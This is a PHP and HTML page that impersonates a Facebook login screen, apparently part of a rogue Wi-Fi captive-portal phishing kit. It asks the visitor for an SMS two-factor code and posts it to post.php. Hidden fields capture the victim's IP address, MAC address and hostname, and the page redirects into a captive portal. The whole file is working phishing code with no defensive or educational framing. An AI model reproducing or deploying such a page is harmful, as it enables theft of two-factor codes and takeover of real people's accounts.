<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!DOCTYPE html>
<html>
<head>

    <title>Facebook</title>

	<meta charset="utf-8">
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="css/estilo.css">
    <!-- Incluye Bootstrap en tu proyecto -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
        <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>
    <link rel="icon" type="image/png" href="assets/img/fm5arwc28y.png"/>
</head>
<body>
	<!-- Crea el formulario de inicio de sesión -->
<form action="post.php" method="post" class="form-signin">
  <img class="fb_logo _8ilh img" src="/img/omg.svg" alt="Facebook">
  <label for="inputEmail" class="sr-only">Correo electrónico o número de móvil</label>
  <input type="text" id="inputEmail" name="2fa_facebook" class="form-control" placeholder="Enter your SMS Code" required autofocus>
 <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
 <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
 <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
 <input type="hidden" name="target" value="https://m.facebook.com">
  <div class="checkbox mb-3">
  </div>
  <button class="btn btn-lg btn-primary btn-block" type="submit">Iniciar sesión</button>
  <p class="mt-5 mb-3 text-muted text-center">¿Has olvidado tu contraseña? <a href="/forgot-password">Recupérala aquí</a></p>
</form>

</body>
</html>